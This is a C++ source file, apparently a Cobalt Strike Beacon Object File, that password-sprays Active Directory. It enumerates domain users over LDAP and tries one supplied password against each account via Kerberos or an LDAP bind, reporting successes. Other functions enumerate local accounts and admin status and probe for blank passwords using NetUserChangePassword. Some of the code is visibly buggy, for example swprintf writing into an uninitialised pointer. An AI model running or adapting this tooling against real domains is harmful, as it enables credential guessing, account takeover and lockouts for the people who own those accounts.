	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = 1000;
	DWORD dwNumPrefs = 1;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->SetSearchPreference(&SearchPrefs, dwNumPrefs);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set search preference.\n");
		goto CleanUp;
	}

	// Add the filter.
	if (bListALL)
	{
		lpwFilterName = L"*";
	}
	if (lpwFilterName == NULL) {
		//		lpwFilter = L"*";
		BeaconPrintf(CALLBACK_ERROR, "Empty username!\n");
		return hr;
	}

	swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwFilterName);


	pUserInfo = (PUSER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO));
	if (pUserInfo == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate UserInfo memory.\n");
		goto CleanUp;
	}

	// Return specified properties
	hr = pContainerToSearch->ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &hSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to execute search.\n");
		goto CleanUp;
	}

	if (SUCCEEDED(hr)) {
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
		hr = pContainerToSearch->GetFirstRow(hSearch);
		if (SUCCEEDED(hr))
		{
			while (hr != S_ADS_NOMORE_ROWS)
			{
				UserAccount userAct;

				userAct.strAccountType = L"3";
				userAct.strDomain = pdcInfo->DomainName;
				userAct.strIsDomain = "1";
				userAct.strPwdExpireTime = "never";
				userAct.bAdmin = FALSE;

				// Keep track of count.
				iCount++;

				// Loop through the array of passed column names.
				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS)
				{
					hr = pContainerToSearch->GetColumn(hSearch, pszColumn, &col);
					if (SUCCEEDED(hr)) {
						ConvertColToUAStruct(col, userAct);

						BOOL bLdapAuth = TRUE;
						LPCWSTR lpwSprayPasswd = L"Dowhile(1);return;";
#if 0
						if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING)
						{
							for (x = 0; x < col.dwNumValues; x++) {
								if (_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0)
								{
									if (bLdapAuth)
									{
										LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
										LPCOLESTR pIADsIIDsUser = L"{3E37E320-17E2-11CF-ABC4-02608C9E7553}";
										HRESULT hr = IIDFromString(pIADsIIDsUser, &IADsIID);
										if (FAILED(hr)) {
											printf("Failed to resolve IID.\n");
											break;
										}
										IID_IADs;
										IADsUser* pUser;
										hr = ADsOpenObject(L"LDAP://rootDSE",
											NULL,
											NULL,
											ADS_SECURE_AUTHENTICATION | ADS_FAST_BIND, // Use Secure Authentication
											IADsIID,
											(void**)&pUser);
										if (FAILED(hr))
										{
											printf("[-] Failed => %ls\\%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString);
										}

										if (SUCCEEDED(hr))
										{
											BSTR bstr;
											VARIANT var;
											VariantInit(&var);
											pRoot->Get(CComBSTR("HomeDirectory"), &var);
											pUser->get_HomeDirectory(&bstr);

											BeaconPrintToStreamW(L"[+] STUPENDOUS => %ls\\%ls:%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString, lpwSprayPasswd);
											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);

											dwAccountsSuccess = dwAccountsSuccess + 1;
											VariantClear(&var);
										}
										if (pRoot)
										{
											pRoot->Release();
											pRoot = NULL;
										}
									}
									else
									{
										BOOL bResult = LogonUserSSPI(L"Kerberos",
											pdcInfo->DomainName,
											col.pADsValues->CaseIgnoreString,
											(LPWSTR)lpwSprayPasswd);

										if (!bResult)
										{
											BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls-%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString, col.pADsValues->CaseIgnoreString);
										}
										if (bResult)
										{
											BeaconPrintToStreamW(L"[+] STUPENDOUS => %ls\\%ls:%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString, lpwSprayPasswd);
											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);

											dwAccountsSuccess = dwAccountsSuccess + 1;
										}
									}
									break;
								}
							}
						}
#endif

						pContainerToSearch->FreeColumn(&col);
					}

					if (pszColumn != NULL) {
						FreeADsMem(pszColumn);
					}
				}

				char homepath[BUF_SIZE];
				size_t length = BUF_SIZE;

				PSID sid;
				ConvertStringSidToSid(userAct.strSID, &sid);

				QueryAdHomePathFromSid(homepath, length, sid, pdcInfo->DomainName);

				Users.emplace_back(userAct);




				// Get the next row
				hr = pContainerToSearch->GetNextRow(hSearch);

			}
		}
		// Close the search handle to clean up
		pContainerToSearch->CloseSearchHandle(hSearch);
	}

	if (SUCCEEDED(hr) && 0 == iCount) {
		hr = S_FALSE;
	}

	if (dwAccountsSuccess == 0) {
		BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls (Skip!)\n", pdcInfo->DomainName, lpwFilterName);
	}

CleanUp:
	if (pUserInfo != NULL) {
		HeapFree(GetProcessHeap(), 0, pUserInfo);
	}

	return hr;
}

BOOL IsDomainAdmin(_In_ IDirectorySearch* pContainerToSearch, _In_ LPCWSTR lpwFilterName)
{
	BOOL bRet = FALSE;
	HRESULT hr = S_OK;
	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
	LPCWSTR pszAttrFilter[] = {
		L"isCriticalSystemObject", // boolean 
		L"sAMAccountName", // boolean 
	};

	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)((sAMAccountName=%ls)))"; // Only enabled accounts // (!(userAccountControl:1.2.840.113556.1.4.803:=2))

	PUSER_INFO pUserInfo = NULL;
	INT iCount = 0;
	DWORD x = 0L;
	LPWSTR pszColumn = NULL;
	IADs* pRoot = NULL;
	IID IADsIID;
	ADS_SEARCH_COLUMN col;
	DWORD dwAccountsFailed = 0;
	DWORD dwAccountsSuccess = 0;
	vector<UserAccount> uAccounts;
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return S_FALSE;
	}

	_FreeADsMem FreeADsMem = (_FreeADsMem)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "FreeADsMem");
	if (FreeADsMem == NULL) {
		return S_FALSE;
	}

	if (!pContainerToSearch) {
		return E_POINTER;
	}

	// Calculate Program run time.
	LARGE_INTEGER frequency;
	LARGE_INTEGER start;
	LARGE_INTEGER end;
	double interval;

	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&start);

	// Specify subtree search
	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = 1000;
	DWORD dwNumPrefs = 1;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->SetSearchPreference(&SearchPrefs, dwNumPrefs);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set search preference.\n");
		goto CleanUp;
	}

	// Add the filter.
	if (lpwFilterName == NULL) {
		//		lpwFilter = L"*";
		BeaconPrintf(CALLBACK_ERROR, "Empty username!\n");
		return hr;
	}
	swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwFilterName);


	pUserInfo = (PUSER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO));
	if (pUserInfo == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate UserInfo memory.\n");
		goto CleanUp;
	}

	// Return specified properties
	hr = pContainerToSearch->ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &hSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to execute search.\n");
		goto CleanUp;
	}

		
	if (SUCCEEDED(hr)) {
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
		hr = pContainerToSearch->GetFirstRow(hSearch);
		if (SUCCEEDED(hr))
		{
			while (hr != S_ADS_NOMORE_ROWS)
			{
				UserAccount uAccount;

				// Keep track of count.
				iCount++;

				uAccount.bAdmin = FALSE;

				// Loop through the array of passed column names.
				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS)
				{
					hr = pContainerToSearch->GetColumn(hSearch, pszColumn, &col);
					if (SUCCEEDED(hr)) {

						ConvertColToUAStruct(col, uAccount);

						pContainerToSearch->FreeColumn(&col);
					}

					if (pszColumn != NULL) {
						FreeADsMem(pszColumn);
					}
				}

				uAccounts.emplace_back(uAccount);

				// Get the next row
				hr = pContainerToSearch->GetNextRow(hSearch);

			}
		}
		// Close the search handle to clean up
		pContainerToSearch->CloseSearchHandle(hSearch);
	}

	if (uAccounts.size() == 1)
	{
		if (uAccounts[0].bAdmin == 1 && uAccounts[0].UserName.CompareNoCase("Administrator") == 0)
		{
			bRet = TRUE;
		}
	}

	if (SUCCEEDED(hr) && 0 == iCount) {
		hr = S_FALSE;
	}

	if (dwAccountsSuccess == 0) {
		BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls (Skip!)\n", pdcInfo->DomainName, lpwFilterName);
	}

CleanUp:

	if (pUserInfo != NULL) {
		HeapFree(GetProcessHeap(), 0, pUserInfo);
	}

	return bRet;
}

HRESULT SearchDirectory(_In_ LPCWSTR lpwSprayPasswd, _In_ LPCWSTR lpwFilter, _In_ BOOL bLdapAuth, _In_ LPCWSTR lpwMaxBadPwdCount) 
{
	HRESULT hr = S_OK;
	HINSTANCE hModule = NULL;
	IADs* pRoot = NULL;
	IDirectorySearch* pContainerToSearch = NULL;
	IID IADsIID, IDirectorySearchIID;

	WCHAR wcPathName[BUF_SIZE] = { 0 };
	VARIANT var;
	VARIANT varHostName;

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return hr;
	}

	DWORD dwRet = DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &pdcInfo);
	if (dwRet != ERROR_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get domain/dns info.");
		goto CleanUp;
	}

	// Initialize COM.
	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
	LPCOLESTR pIDirectorySearchIID = L"{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}";

	hr = IIDFromString(pIADsIID, &IADsIID);
	hr = IIDFromString(pIDirectorySearchIID, &IDirectorySearchIID);

	// Get rootDSE and the current user's domain container DN.
	hr = ADsOpenObject(L"LDAP://rootDSE",
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		IADsIID,
		(void**)&pRoot);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
		goto CleanUp;
	}

	VariantInit(&var);
	hr = pRoot->Get((BSTR)L"defaultNamingContext", &var);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
		goto CleanUp;
	}

	VariantInit(&varHostName);
	hr = pRoot->Get((BSTR)L"dnsHostName", &varHostName);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get dnsHostName.");
		goto CleanUp;
	}

	wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
	wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);

	hr = ADsOpenObject((LPCWSTR)wcPathName,
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		IDirectorySearchIID,
		(void**)&pContainerToSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ADsOpenObject failed.\n");
		goto CleanUp;
	}

	hr = SprayUsers(pContainerToSearch,	lpwSprayPasswd, lpwFilter, bLdapAuth, lpwMaxBadPwdCount);

CleanUp:

	if (pdcInfo != NULL) {
		NetApiBufferFree(pdcInfo);
	}

	if (pContainerToSearch != NULL) {
		pContainerToSearch->Release();
		pContainerToSearch = NULL;
	}

	if(pRoot != NULL){
		pRoot->Release();
		pRoot = NULL;
	}

	CoUninitialize();

	return hr;
}


BOOL SearchCurDomainUser(vector<UserAccount>& Users, const CString& deviceName, const CString& userName)
{
	BOOL bRet = FALSE;

	HRESULT hr = S_OK;
	HINSTANCE hModule = NULL;
	IADs* pRoot = NULL;
	IDirectorySearch* pContainerToSearch = NULL;
	IID IADsIID, IDirectorySearchIID;

	WCHAR wcPathName[BUF_SIZE] = { 0 };
	VARIANT var;
	VARIANT varHostName;
	VARIANT varconfigurationNamingContext;
	CString strDomainName;
	CStringW strwDomainName;

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return hr;
	}

	DWORD dwRet = DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &pdcInfo);
	if (dwRet != ERROR_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get domain/dns info.");
		goto CleanUp;
	}

	// Initialize COM.
	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
	LPCOLESTR pIDirectorySearchIID = L"{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}";

	hr = IIDFromString(pIADsIID, &IADsIID);
	hr = IIDFromString(pIDirectorySearchIID, &IDirectorySearchIID);

	// Get rootDSE and the current user's domain container DN.
	hr = ADsOpenObject(L"LDAP://rootDSE",
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		IADsIID,
		(void**)&pRoot);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
		goto CleanUp;
	}

	VariantInit(&var);
	hr = pRoot->Get((BSTR)L"defaultNamingContext", &var);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
		goto CleanUp;
	}
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get varconfigurationNamingContext.");
		goto CleanUp;
	}

	wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
	wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);

	hr = ADsOpenObject((LPCWSTR)wcPathName,
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		IDirectorySearchIID,
		(void**)&pContainerToSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ADsOpenObject failed.\n");
		goto CleanUp;
	}

	if (IsDomainAdmin(pContainerToSearch, CStringW("Administrator")))
	{
		printf("is Domain Administrator");
	}


	if (IsDomainAdmin(pContainerToSearch, CStringW(userName)))
	{
		hr = SprayCurDomainUsers(pContainerToSearch, TRUE, CStringW(deviceName), CStringW(userName), Users);
	}
	else
	{
		hr = SprayCurDomainUsers(pContainerToSearch, FALSE, CStringW(deviceName), CStringW(userName), Users);
	}

CleanUp:

	if (pdcInfo != NULL) {
		NetApiBufferFree(pdcInfo);
	}

	if (pContainerToSearch != NULL) {
		pContainerToSearch->Release();
		pContainerToSearch = NULL;
	}

	if (pRoot != NULL) {
		pRoot->Release();
		pRoot = NULL;
	}

	CoUninitialize();

	bRet = TRUE;
End:
	return bRet;

}

VOID go(IN PCHAR Args, IN ULONG Length) {
	HRESULT hr = S_OK;
	BOOL bLdapAuth = FALSE;
	LPCWSTR lpwSprayPasswd = NULL;
	LPCWSTR lpwAuthService = NULL;
	LPCWSTR lpwMaxBadPwdCount = NULL;

	// Parse Arguments
	datap parser;
	BeaconDataParse(&parser, Args, Length);
	
	lpwSprayPasswd = (WCHAR*)BeaconDataExtract(&parser, NULL);
	if (lpwSprayPasswd == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "No password specified!\n");
		return;
	}

	size_t userlistLength = BeaconDataInt(&parser);
	char* userlistData = BeaconDataExtract(&parser, NULL);
	lpwAuthService = (WCHAR*)BeaconDataExtract(&parser, NULL);
	lpwMaxBadPwdCount = (WCHAR*)BeaconDataExtract(&parser, NULL);


	if (lpwAuthService != NULL && _wcsicmp(lpwAuthService, L"ldap") == 0) {
		bLdapAuth = TRUE;
	}
	BeaconPrintToStreamW(L"--------------------------------------------------------------------\n");
	BeaconPrintToStreamW(L"%ls based password spray\n", bLdapAuth ? L"LDAP" : L"Kerberos");

	char* str_tmp = (char*)malloc(userlistLength + 1);
	memset(str_tmp, 0, userlistLength + 1);
	int j = 0;

	wchar_t* ws;
	
	for(int i=0; i<userlistLength; i++){
		//if(userlistData[i] == 0x2c){
		if(userlistData[i] == 0x0a){
			if (i == j) {
				j++;
				continue;
			}
			memcpy(str_tmp, userlistData + j, i-j);
			swprintf(ws, L"%S", str_tmp);
			hr = SearchDirectory(lpwSprayPasswd, ws, bLdapAuth, lpwMaxBadPwdCount);
			if (FAILED(hr)) {
				GetFormattedErrMsg(hr);
			}
			memset(str_tmp, 0, userlistLength + 1);
			j = i + 1;
		}
		else if(i == userlistLength - 1){
			memcpy(str_tmp, userlistData + j, i-j);
			swprintf(ws, L"%S", str_tmp);
			hr = SearchDirectory(lpwSprayPasswd, ws, bLdapAuth, lpwMaxBadPwdCount);
			if (FAILED(hr)) {
				GetFormattedErrMsg(hr);
			}
			memset(str_tmp, 0, userlistLength + 1);
		}
	}

	BeaconOutputStreamW();
	BeaconPrintToStreamW(L"--------------------------------------------------------------------\n");

	return;
}

#define MAX_DEVICE_ID_LEN 1024

int GetFullDeviceName()
{
	GUID InterfaceClassGuid;
	HDEVINFO hDevInfo;
	SP_DEVINFO_DATA DeviceInfoData;
	DWORD i;
	char szDeviceInstanceID[MAX_DEVICE_ID_LEN];
	char szFriendlyName[1024];

	// 获取通用串行总线接口类GUID  
	const GUID GUID_CLASS_USB = { 0x4d1e55b4, 0xe075, 0x11cf, { 0x88, 0xcb, 0x00, 0x11, 0x11, 0x00, 0x00, 0x30 } };
	InterfaceClassGuid = GUID_CLASS_USB;

	// 获取设备信息集  
	hDevInfo = SetupDiGetClassDevs(&InterfaceClassGuid, NULL, NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
	if (hDevInfo == INVALID_HANDLE_VALUE) {
		std::cerr << "无法获取设备信息集" << std::endl;
		return 1;
	}

	// 遍历设备信息集中的设备项  
	for (i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData); i++) {
		// 获取设备实例ID  
		if (!SetupDiGetDeviceInstanceId(hDevInfo, &DeviceInfoData, szDeviceInstanceID, MAX_DEVICE_ID_LEN, NULL)) {
			std::cerr << "无法获取设备实例ID" << std::endl;
			break;
		}

		// 获取设备友好名称  
		if (!SetupDiGetDeviceRegistryProperty(hDevInfo, &DeviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)szFriendlyName, sizeof(szFriendlyName), NULL)) {
			std::cerr << "无法获取设备友好名称" << std::endl;
			break;
		}

		// 打印设备全名（设备实例ID和友好名称）  
		std::wcout << L"设备全名: " << szDeviceInstanceID << L" - " << szFriendlyName << std::endl;
	}

	// 关闭设备信息集句柄  
	SetupDiDestroyDeviceInfoList(hDevInfo);

	return 0;
}

bool GetCurrentUserAndDomain(OUT wstring& user, OUT wstring& domain)
{
	bool ret = false;

	HWINSTA hWinStation = GetProcessWindowStation();
	if (hWinStation == NULL) {
		//LOG_ERROR(L"Failed to GetProcessWindowStation");
		return false;
	}

	SID* pSID = NULL;
	USEROBJECTFLAGS uof = { 4 };
	DWORD requiredSize;

	GetUserObjectInformation(hWinStation, UOI_USER_SID, NULL, NULL, &requiredSize);

	pSID = (SID*) new BYTE[requiredSize];

	if (!GetUserObjectInformation(hWinStation, UOI_USER_SID, pSID, requiredSize, NULL))
	{
		//LOG_ERROR(L"Failed to GetUserObjectInformation2");
		goto end;
	}

	SID_NAME_USE sidType;
	DWORD dwUserNameSize = 64, dwDomainNameSize = 64;
	wchar_t szUserName[64], szDomainName[64];
	szDomainName[0] = '\0';
	szUserName[0] = '\0';

	if (LookupAccountSidW(NULL, pSID, szUserName, &dwUserNameSize, szDomainName, &dwDomainNameSize, &sidType))
	{
		ret = true;
		user = szUserName;
		domain = szDomainName;
	}

	if (GetLastError() == ERROR_NONE_MAPPED)
	{
		// the SID is a Logon sid
	}
end:
	delete[] pSID;
	return ret;
}

BOOL GetUserSid(LPCWSTR lpUser, CString& szOutSID)
{
	if (lpUser && lpUser[0])
	{
		SID_NAME_USE eSidType;
		LPWSTR lpSID = NULL;
		char sid_buffer[1024] = { 0 };
		DWORD cbSid = sizeof(sid_buffer);

		WCHAR sDomain[1024] = { 0 };
		DWORD dwDomainLen = 1024;
		SID* sid = (SID*)sid_buffer;

		if (!LookupAccountNameW(NULL, lpUser, sid_buffer, &cbSid, sDomain, &dwDomainLen, &eSidType))
		{
			printf("[GetUserSid] LookupAccountName : %s failed, error : %d", lpUser, GetLastError());
			return FALSE;
		}

		if (!ConvertSidToStringSidW(sid, &lpSID))
		{
			printf("[GetUserSid] ConvertSidToStringSid failed, error : %d", GetLastError());
			return FALSE;
		}

		szOutSID = lpSID;

		if (lpSID)
		{
			LocalFree(lpSID);
		}

		printf("[GetUserSid] lpSID : %s", szOutSID);
		return TRUE;
	}

	printf("[GetUserSid] invalid lpUser : %s", lpUser);
	return FALSE;
}

BOOL IsAdmin(LPCWSTR lpUser, CString& sOutGroup)
{
	BOOL bAdmin = FALSE;
	NET_API_STATUS status;
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;

	status = NetUserGetLocalGroups(NULL, lpUser, 0, LG_INCLUDE_INDIRECT, (LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries);
	if (status == NERR_Success)
	{
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;
		if ((pTmpBuf = pBuf) != NULL)
		{
			for (DWORD i = 0; i < dwEntriesRead; i++)
			{
				if (pTmpBuf == NULL)
				{
					break;
				}

				sOutGroup = pTmpBuf->lgrui0_name;
				printf("[Utils::IsAdmin] GroupName : %s", pTmpBuf->lgrui0_name);
				CStringA Group = pTmpBuf->lgrui0_name;
				if (StrCmpI("Administrators", Group) == 0)
				{
					bAdmin = TRUE;
					break;
				}

				pTmpBuf++;
			}
		}
	}

	if (pBuf != NULL)
		NetApiBufferFree(pBuf);

	return bAdmin;
}

bool GetUserInfo(CString servername, CString username, DWORD level)
{
	return true;
}

bool GetUsers(vector<UserAccount>& vecUsers)
{
	bool bRet = false;
	LPUSER_INFO_2 pBuf = NULL;
	LPUSER_INFO_2 pTmpBuf;
	DWORD dwLevel = 2;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;

	WCHAR  sDomain[MAX_COMPUTERNAME_LENGTH + 2] = { 0 };
	DWORD  bufCharCount = MAX_COMPUTERNAME_LENGTH + 2;
	GetComputerNameW(sDomain, &bufCharCount);

	CStringW strDomain = GetDomainName();

	printf("[%s] domain: %S", __FUNCTIONW__, sDomain);

	do // begin do
	{
		nStatus = NetUserEnum(NULL, dwLevel, FILTER_NORMAL_ACCOUNT | FILTER_INTERDOMAIN_TRUST_ACCOUNT | FILTER_SERVER_TRUST_ACCOUNT, (LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL)
					{
						printf("[%s] An access violation has occurred", __FUNCTIONW__);
						break;
					}

					UserAccount UserAcc;
					UserAcc.tmLastLogon = 0;
					UserAcc.strIsDomain = "2";

					UserAcc.UserName = pTmpBuf->usri2_name;
					printf("[CNtUsers]:Name: %s", UserAcc.UserName);

					UserAcc.strDomain = sDomain;
					printf("[CNtUsers]:Domain: %s", UserAcc.strDomain);

					UserAcc.bDisabled = (pTmpBuf->usri2_flags & UF_ACCOUNTDISABLE) != 0;
					printf("[CNtUsers]:Disabled: %d", UserAcc.bDisabled);

					GetUserSid(pTmpBuf->usri2_name, UserAcc.strSID);
					printf("[CNtUsers]:SID: %s", UserAcc.strSID);

					UserAcc.strHomePath = pTmpBuf->usri2_home_dir;
					printf("[%s] home path : %s", __FUNCTIONW__, UserAcc.strHomePath);

					UserAcc.bAdmin = FALSE;
					if (pTmpBuf->usri2_priv == USER_PRIV_ADMIN)
					{
						UserAcc.bAdmin = TRUE;
					}
					printf("[CNtUsers] IsAdmin : %d", UserAcc.bAdmin);

					CString sGroupName;
					CStringW username = UserAcc.UserName;
					IsAdmin(username, sGroupName);
					UserAcc.strGroup = sGroupName;

					UserAcc.tmLastLogon = pTmpBuf->usri2_last_logon;
					printf("[CNtUsers] logon time : %d", pTmpBuf->usri2_last_logon);

					printf("[%s] usri2_flags : 0x%08x", __FUNCTIONW__, pTmpBuf->usri2_flags);
					UserAcc.dwPwStatus = 1;
					if (pTmpBuf->usri2_flags & UF_LOCKOUT)
					{
						UserAcc.dwPwStatus = 3;
					}
					else
					{
						CStringW userN = UserAcc.UserName;
						nStatus = NetUserChangePassword(sDomain, userN, L"", L"");
						if (nStatus == NERR_Success)
						{
							UserAcc.dwPwStatus = 2;
						}
					}

					{
						CTime tCurTime = CTime::GetCurrentTime();
						CTimeSpan span = CTimeSpan(0, 0, 0, pTmpBuf->usri2_password_age);
						tCurTime -= span;
						UserAcc.strPwdChangeTime = tCurTime.Format("%Y-%m-%d %H:%M:%S");

						if ((pTmpBuf->usri2_flags & UF_DONT_EXPIRE_PASSWD))
						{
							UserAcc.strPwdExpireTime = "never";
						}
						else
						{
							auto GetExpireTimeFromGPE = [=](CTime CurTime) -> CString {
								DWORD dwLevel = 0;
								USER_MODALS_INFO_0* pBuf = NULL;
								NET_API_STATUS nStatus;

								nStatus = NetUserModalsGet(NULL,
									dwLevel,
									(LPBYTE*)&pBuf);
								if (nStatus == NERR_Success)
								{
									if (pBuf != NULL)
									{
										CTimeSpan span = CTimeSpan(0, 0, 0, pBuf->usrmod0_max_passwd_age);

										CurTime += span;
									}
								}
								else
								{
									printf("[%s]A system error has occurred: %d", __FUNCTIONW__, nStatus);

									return "Unknown";
								}
								if (pBuf != NULL)
									NetApiBufferFree(pBuf);

								return CurTime.Format("%Y-%m-%d %H:%M:%S");
								};

							// 过期时间 = 上次修改密码时间 + 密码最长使用期限
							UserAcc.strPwdExpireTime = GetExpireTimeFromGPE(tCurTime);
						}
					}

					UserAcc.strAccountType = "1";
					CString sUserNameLow = UserAcc.UserName;
					sUserNameLow.MakeLower();
					set<CString>            g_setPublicUser = {
						L"administrator",
						L"guest",
						L"defaultaccount",
						L"homegroupuser$",
						L"wdagutilityaccount"
					};

					if (g_setPublicUser.find(CString(sUserNameLow)) != g_setPublicUser.end())
					{
						UserAcc.strAccountType = "2";
					}

					UserAcc.strIsDomain = "2";

					vecUsers.push_back(UserAcc);

					bRet = true;
					pTmpBuf++;
					dwTotalCount++;

					printf("\n");
				}
			}
		}
		else
		{
			printf("[%s] A system error has occurred: %d", __FUNCTIONW__, nStatus);
		}

		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL)
		NetApiBufferFree(pBuf);

	return bRet;
}


BOOL GetDomainFullName(const WCHAR* domain, const WCHAR* uid, WCHAR* full_name)
{
	WCHAR	nt_domain[256];
	HMODULE hModule;

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return FALSE;
	}

	swprintf(nt_domain, L"WinNT://%s", domain);

	IADsContainer* ads = NULL;
	if (::ADsGetObject(nt_domain, IID_IADsContainer, (void**)&ads) < S_OK) {
		return	FALSE;
	}

	BOOL		ret = FALSE;
	BSTR		buid = ::SysAllocString(uid);
	IDispatch* udis = NULL;

	if (ads->GetObject(L"User", buid, &udis) >= S_OK) {
		IADsUser* user = NULL;

